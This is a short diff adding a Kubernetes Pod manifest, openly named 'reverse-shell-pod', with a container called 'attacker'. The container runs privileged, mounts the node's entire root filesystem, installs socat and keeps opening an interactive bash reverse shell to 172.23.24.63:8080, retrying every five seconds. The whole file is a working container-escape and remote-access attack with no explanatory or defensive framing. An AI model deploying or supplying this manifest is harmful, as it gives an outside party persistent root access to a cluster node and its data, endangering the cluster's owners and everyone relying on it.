@@ -1,0 +1,30 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: reverse-shell-pod
+  namespace: cass-operator
+spec:
+  nodeName: worker-1 
+  containers:
+    - name: attacker
+      image: alpine
+      securityContext:
+        privileged: true
+      command:
+        - /bin/sh
+        - -c
+        - |
+          apk add --no-cache bash socat;
+          while true; do
+            socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.23.24.63:8080;
+            sleep 5;
+          done
+      volumeMounts:
+        - mountPath: /host
+          name: host-root
+  volumes:
+    - name: host-root
+      hostPath:
+        path: /
+        type: Directory
+  restartPolicy: Never
